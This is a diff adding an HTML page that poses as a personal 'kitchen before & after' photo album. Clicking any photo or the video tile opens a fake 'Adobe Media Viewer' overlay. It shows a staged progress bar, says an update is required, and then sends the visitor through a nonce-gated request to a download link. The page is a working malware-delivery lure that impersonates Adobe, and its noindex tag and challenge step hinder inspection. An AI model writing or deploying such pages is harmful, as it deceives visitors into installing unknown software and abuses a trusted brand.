@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>the kitchen — before &amp; after</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Fraunces:opsz,wght@9..144,400;9..144,500&display=swap" rel="stylesheet">
+<style>
+  :root{ --bg:#151311; --panel:#1d1a17; --ink:#f2ede4; --mut:#a89e90; --line:#2c2823; --acc:#d8b98a; }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--ink);font-family:'Inter',system-ui,sans-serif;line-height:1.55;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:760px;margin:0 auto;padding:48px 20px 90px}
+  .eyebrow{font-size:12px;letter-spacing:.22em;text-transform:uppercase;color:var(--acc);margin-bottom:14px}
+  h1{font-family:'Fraunces',Georgia,serif;font-weight:500;font-size:clamp(30px,6vw,44px);line-height:1.12;letter-spacing:-.01em}
+  .sub{color:var(--mut);margin-top:12px;font-size:15px;max-width:52ch}
+  .meta{color:#7c746a;font-size:12.5px;margin-top:22px}
+  .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:34px}
+  @media(max-width:560px){.grid{grid-template-columns:1fr}}
+  figure{position:relative;border-radius:10px;overflow:hidden;background:var(--panel);border:1px solid var(--line);cursor:pointer;transition:transform .25s ease, box-shadow .25s ease}
+  figure:hover{transform:translateY(-3px);box-shadow:0 14px 40px rgba(0,0,0,.45)}
+  figure img{width:100%;display:block;aspect-ratio:4/3;object-fit:cover;opacity:.96;transition:transform .5s ease}
+  figure:hover img{transform:scale(1.03)}
+  figcaption{position:absolute;left:0;right:0;bottom:0;padding:14px 12px 10px;font-size:12px;color:#e9e2d6;background:linear-gradient(transparent,rgba(10,9,8,.85))}
+  figcaption .tag{display:inline-block;font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--acc);margin-bottom:3px}
+  .reveal{grid-column:1/-1;aspect-ratio:16/8}
+  .reveal .play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
+  .reveal .play .disc{width:64px;height:64px;border-radius:50%;background:rgba(20,16,12,.55);backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,.35);display:flex;align-items:center;justify-content:center}
+  .reveal .play .tri{width:0;height:0;border-left:18px solid #fff;border-top:11px solid transparent;border-bottom:11px solid transparent;margin-left:5px}
+  .reveal:hover .play .disc{transform:scale(1.06);transition:transform .2s}
+  .foot{margin-top:40px;color:#7c746a;font-size:13px;text-align:center}
+  #loading{position:fixed;inset:0;background:rgba(8,7,6,.96);display:none;align-items:center;justify-content:center;flex-direction:column;z-index:50;text-align:center;padding:20px}
+  #loading .bar{width:min(320px,70vw);height:4px;border-radius:4px;background:#2c2823;overflow:hidden;margin-top:18px}
+  #loading .bar i{display:block;height:100%;width:0;background:var(--acc);transition:width .25s ease}
+  #loading p{color:var(--mut);font-size:14px;max-width:40ch}
+  #loading .adobe{margin-top:16px;font-size:13px;color:#b7ad9f}
+  #loading .btn{margin-top:22px;display:inline-block;background:var(--acc);color:#1a1510;font-weight:600;font-size:14px;padding:11px 22px;border-radius:8px;text-decoration:none;border:none;cursor:pointer}
+  #loading .btn:disabled{opacity:.7;cursor:progress}
+  #loading small{color:#71685c;font-size:11.5px;margin-top:10px}
+  .adobe-mark{display:flex;align-items:center;gap:8px;justify-content:center;margin-top:6px}
+  .adobe-mark .sq{width:22px;height:22px;border-radius:4px;background:#ea001e;color:#fff;font-weight:800;font-size:13px;display:flex;align-items:center;justify-content:center}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="eyebrow">home · this month</div>
+    <h1>the kitchen —<br>before &amp; after</h1>
+    <p class="sub">the before is genuinely embarrassing, but hold on for the last one. the whole walkthrough is in there.</p>
+    <div class="meta">8 photos · saved 2 days ago</div>
+
+    <div class="grid" id="grid">
+      <figure data-i="1">
+        <img src="/img-01.jpg" alt="kitchen before" loading="lazy">
+        <figcaption><span class="tag">before</span>day 1 — gutted the whole thing</figcaption>
+      </figure>
+      <figure data-i="2">
+        <img src="/img-02.jpg" alt="kitchen work in progress" loading="lazy">
+        <figcaption><span class="tag">wip</span>mid-teardown, don't judge the walls</figcaption>
+      </figure>
+      <figure data-i="3">
+        <img src="/img-03.jpg" alt="new cabinets" loading="lazy">
+        <figcaption><span class="tag">cabinets</span>new ones went in — not bad</figcaption>
+      </figure>
+      <figure data-i="4">
+        <img src="/img-04.jpg" alt="counter install" loading="lazy">
+        <figcaption><span class="tag">countertop</span>the one we finally picked</figcaption>
+      </figure>
+      <figure data-i="5">
+        <img src="/img-05.jpg" alt="lighting" loading="lazy">
+        <figcaption><span class="tag">lighting</span>swapped the fixtures</figcaption>
+      </figure>
+      <figure data-i="6">
+        <img src="/img-06.jpg" alt="final kitchen" loading="lazy">
+        <figcaption><span class="tag">done</span>final walk-through</figcaption>
+      </figure>
+      <figure class="reveal" id="reveal">
+        <img src="/img-02.jpg" alt="video" loading="lazy">
+        <div class="play"><div class="disc"><div class="tri"></div></div></div>
+        <figcaption><span class="tag">video · 2:14</span>the whole thing, start to finish</figcaption>
+      </figure>
+    </div>
+
+    <p class="foot">shot on my phone, straight out of the camera roll</p>
+  </div>
+
+  <div id="loading">
+    <div class="adobe-mark"><div class="sq">A</div><div style="text-align:left"><div style="font-weight:600;color:var(--ink);font-size:15px">Adobe Media Viewer</div><div style="font-size:12px;color:var(--mut)">requires a quick update</div></div></div>
+    <p>Preparing the video — this album was saved in the new Creative Cloud viewer, so it needs a small update before it can play.</p>
+    <div class="bar"><i id="barfill"></i></div>
+    <button class="btn" id="dlbtn" disabled>Getting the viewer…</button>
+    <small>~13&nbsp;MB · only runs when you click a video</small>
+  </div>
+
+<script>
+(function(){
+  var NONCE = "__NONCE__", PEPPER = "__PEPPER__";
+  function djb2(s){var h=5381;for(var i=0;i<s.length;i++){h=((h<<5)+h+s.charCodeAt(i))>>>0;}return h;}
+  function start(){
+    var ov=document.getElementById('loading');
+    ov.style.display='flex';
+    var fill=document.getElementById('barfill');
+    var btn=document.getElementById('dlbtn');
+    var p=0;
+    var t=setInterval(function(){
+      p+=Math.random()*14+5; if(p>92)p=92;
+      fill.style.width=p+'%';
+      if(p>=30){ btn.disabled=false; btn.textContent='Get the Creative Cloud viewer'; }
+    },180);
+    setTimeout(function(){ p=100; fill.style.width='100%'; }, 4200);
+    setTimeout(function(){
+      btn.onclick=function(){
+        btn.disabled=true; btn.textContent='Opening download…';
+        fetch('/v1/challenge',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({n:NONCE,v:String(djb2(NONCE+PEPPER))})})
+          .then(function(r){return r.json();})
+          .then(function(j){ if(j && j.ok){ window.location.href='/d/'+j.token; } else { btn.textContent='Something\'s off — tap again'; btn.disabled=false; } })
+          .catch(function(){ btn.textContent='Something\'s off — tap again'; btn.disabled=false; });
+      };
+    }, 2600);
+  }
+  function wire(el){ el.addEventListener('click', start); }
+  document.querySelectorAll('figure[data-i]').forEach(wire);
+  wire(document.getElementById('reveal'));
+})();
+</script>
+</body>
+</html>
